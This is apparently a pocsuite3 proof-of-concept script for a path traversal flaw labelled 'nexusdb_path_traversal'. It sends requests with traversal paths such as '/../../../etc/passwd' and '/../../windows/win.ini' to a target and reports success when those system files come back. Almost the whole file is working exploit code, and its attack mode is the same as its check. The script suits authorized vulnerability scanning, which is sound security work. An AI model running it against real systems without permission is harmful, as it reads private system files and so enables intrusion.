#!/usr/bin/env python
# -*- coding:utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''nexusdb_path_traversal'''
    desc = ''''''
    severity = '''medium'''
    vulType = '''dir-listing'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = ''''''
    appVersion = ''''''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}

        actions = ["/../../../../../../../../windows/win.ini","/../../../../../../../../../../etc/passwd"]
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
        }
        for action in actions:
            verify_url = make_verify_url(self.url, action,mod=0)
            resp1 = requests.get(verify_url, headers=headers, verify=False, timeout=15, allow_redirects=False)
            if resp1.status_code == 200 and (b"; for 16-bit app support" in resp1.content or (b"root:" in resp1.content and b"nobody:" in resp1.content and b"/bin:" in resp1.content)):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = resp1.url
                result['VerifyInfo']['port'] = port
                break
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(TestPOC)
